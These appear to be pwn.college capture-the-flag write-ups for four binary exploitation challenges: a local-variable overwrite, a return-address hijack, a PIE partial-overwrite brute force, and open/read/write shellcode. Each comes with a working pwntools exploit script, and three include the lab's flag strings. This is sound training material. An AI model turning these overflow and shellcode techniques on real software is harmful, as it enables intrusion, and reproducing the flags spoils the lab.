# precision (hard) pwncollege

This challenge is identical to its "easy" version from a security perspective, but has the following changes:

Unlike the easy version, it does not give you helpful debug output. You will have to recover this information using a debugger.
The source code is not provided. You will need to reverse-engineer the binary, but remember, the challenge is conceptually the same as the easy version, so it can be helpful to have the easy version's source code as a secondary reference during your reversing process!
Some randomization is different. Buffers might have different lengths, offsets might vary, etc. You will need to reverse engineer this information from the binary!


## solve
- find the binary in /challenge
- open the binary in gdb `gdb binary-exploitation-lose-variable`
- disassemble main function `disass main`
- main calls the challenge function `0x0000000000401e2a <+144>:	call   0x401c75 <challenge>`

### Input Buffer: 
`lea -0x90(%rbp), %rax` (starts at `rbp - 0x90`).

### First Check (Fail Condition):

- `mov -0x14(%rbp), %eax` followed by `test %eax, %eax`.

- If non-zero (jne), it hits exit(1) at <+232>.

- Requirement: rbp - 0x14 must remain 0.

### Second Check (Win Condition):

- `mov -0x18(%rbp), %eax` followed by `test %eax, %eax`.

- If non-zero (jne), it calls <win> at <+249>.

- Requirement: rbp - 0x18 must be written with a non-zero value.


### To satisfy both conditions:

- Fill the first 120 bytes (0x78) with padding.

- Overwrite rbp - 0x18 with 4 non-zero bytes (e.g., 0x00000001 or b"AAAA").

- Stop writing immediately so rbp - 0x14 remains untouched (0) and stack cookies (-0x8(%rbp)) stay intact.


## solution script

```python
from pwn import *

p = process("/challenge/binary-exploitation-lose-variable")

# 120 bytes of padding + 4 non-zero bytes for rbp-0x18
payload = b"A" * 120 + p32(1)

# Send exact bytes
p.send(payload)
print(p.recvall().decode())
```


## flag
`binary-exploitation-lose-variable`

---


# Control Hijack (hard) pwncollege

This challenge is identical to its "easy" version from a security perspective, but has the following changes:

Unlike the easy version, it does not give you helpful debug output. You will have to recover this information using a debugger.
The source code is not provided. You will need to reverse-engineer the binary, but remember, the challenge is conceptually the same as the easy version, so it can be helpful to have the easy version's source code as a secondary reference during your reversing process!
Some randomization is different. Buffers might have different lengths, offsets might vary, etc. You will need to reverse engineer this information from the binary!


## solution
- disassemble the binary at the challenge function

- Input Buffer Offset (`rbp - 0x80`): 
    The instruction `lea -0x80(%rbp), %rax` followed by `call read@plt` indicates that your input buffer starts at `rbp - 0x80` (128 bytes above `%rbp`).
- Max Read Size: 
    The instruction `movq $0x1000, -0x8(%rbp)` sets `rdx = 0x1000` (4096 bytes). This creates an intentional buffer overflow since it reads far more data than the allocated stack buffer can hold.
- Stack Frame Setup: 
    The stack frame is allocated via `sub $0xa0, %rsp` (160 bytes total). The saved Base Pointer (`%rbp`) sits right at offset `0x80` (128 bytes) relative to the start of the input buffer.


offset to RIP=0x80 (Buffer to RBP)+8 (RBP size)=136 bytes

Run `(gdb) info address win` to get the target execution address

```
(gdb) info address win
Symbol "win" is at 0x40158d in a file compiled without debugging.
```

## solution script

```python
from pwn import *

p = process("/challenge/binary-exploitation-control-hijack")

# Address of the win function
win_addr = 0x40158d

# Construction: 128 bytes junk + 8 bytes saved RBP + 8 bytes target address
payload = b"A" * 128 + b"B" * 8 + p64(win_addr)

p.send(payload)
print(p.recvall().decode())

```

## flag

```
pwn.college{gXv3zYWWCxSJtr01EulUAZqFhPL.dRTOywyM1gjNzEzW}
```


# PIEs (hard)
This challenge is identical to its "easy" version from a security perspective, but has the following changes:

Unlike the easy version, it does not give you helpful debug output. You will have to recover this information using a debugger.
The source code is not provided. You will need to reverse-engineer the binary, but remember, the challenge is conceptually the same as the easy version, so it can be helpful to have the easy version's source code as a secondary reference during your reversing process!
Some randomization is different. Buffers might have different lengths, offsets might vary, etc. You will need to reverse engineer this information from the binary!

## solve

because PIE is enabled, the base address of the binary is randomized in memory, meaning we cannot easily hardcode absolute return addresses.

- `disass main` calls challenge
- `disass challenge`
- Buffer capacity is 100 bytes (-0x70(%rbp) to -0xc(%rbp)), with 112 bytes total (0x70) available before reaching the saved %rbp.

- Read Bound: read() accepts up to 4096 bytes (0x1000).

Buffer starts at: rbp - 0x70 (112 bytes)

Saved rbp: 8 bytes

Return address target: rbp + 0x8

Padding = 0x70 + 8 = 120 bytes


- `disass win_authed`

```
0x1ab2 <+0>:   endbr64
0x1ab6 <+4>:   push   %rbp
0x1ab7 <+5>:   mov    %rsp,%rbp
0x1aba <+8>:   sub    $0x10,%rsp
0x1abe <+12>:  mov    %edi,-0x4(%rbp)
0x1ac1 <+15>:  cmpl   $0x1337,-0x4(%rbp)
0x1ac8 <+22>:  jne    0x1bcc
```

win_authed checks its argument: If the argument isn't 0x1337, execution jumps to the end of the function instead of printing the flag.

The instruction immediately after the jne is:

`0x1ace <+28>: lea 0x533(%rip),%rdi`

This is exactly where we want execution to start.

`win_authed + 28 = 0x1ace`

So execution starts after:

```
cmpl $0x1337,-0x4(%rbp)
jne  0x1bcc
```

and goes directly into the flag-reading code.


offsets inside the PIE binary, not necessarily the actual runtime addresses.

Because PIE + ASLR are enabled, the binary gets loaded at a different base address each time.



The saved return address currently points to:

main+134

which is:

0x1d5e

and our target is:

0x1ace

Both addresses use the same randomized PIE base.

The page-aligned portion is randomized, but the lower 12 bits don't change because a page is 0x1000 bytes.


Instead of overwriting the entire 8-byte RIP, we only overwrite the lowest two bytes.

The target ends in:

0x1ace

In little-endian byte order that is:

ce 1a

Therefore:

b"\xce\x1a"

will replace the lowest two bytes of the saved RIP.

The higher bytes remain whatever ASLR originally placed there.

So the payload becomes:

payload = b"A" * 120 + b"\xce\x1a"


## soln script

```
from pwn import *

context.arch = 'amd64'

# \xce\x1a bypasses the 0x1337 check and guesses '1' for the ASLR nibble
payload = b'A' * 120 + b'\xce\x1a'

while True:
    try:
        p = process('/challenge/binary-exploitation-pie-overflow')
        p.send(payload)
        
        output = p.recvall(timeout=1)
        if b'pwn.college{' in output:  # Assuming standard pwn.college flag format
            print(output.decode())
            break
        p.close()
    except EOFError:
        p.close()
```


## flag: 
```
pwn.college{4XJDWJawWYfzJBYAycnrYMaSvZD.dJDMzwyM1gjNzEzW}
```




# Basic Shellcode


## solve

When execve is restricted or stripped of capabilities, read /flag directly using three consecutive syscalls:

open("/flag", O_RDONLY)

- rax = 2 (sys_open)

- rdi = address of string "/flag"

- rsi = 0 (O_RDONLY)

Returns file descriptor (fd, usually 3) in rax.

- read(fd, buffer, count)

- rax = 0 (sys_read)

- rdi = fd returned by open (move from rax to rdi)

- rsi = writeable memory address (such as rsp)

- rdx = 100 (bytes to read)

write(stdout, buffer, count)

- rax = 1 (sys_write)

- rdi = 1 (stdout)

- rsi = buffer address (rsp)

- rdx = bytes actually read (from rax)

## Soln script

```python
from pwn import *

context.arch = 'amd64'

shellcode = asm('''
    mov rax, 2
    lea rdi, [rip + flag_str]
    mov rsi, 0
    syscall

    mov rdi, rax
    mov rax, 0
    mov rsi, rsp
    mov rdx, 100
    syscall

    mov rax, 1
    mov rdi, 1
    mov rsi, rsp
    syscall

flag_str:
    .string "/flag"
''')

p = process('/challenge/binary-exploitation-basic-shellcode')

p.send(shellcode)
p.interactive()
```

## flag
```
pwn.college{g52Q15wj4sNs2-Ht727x1c1tPW7.ddTMywyM1gjNzEzW}
```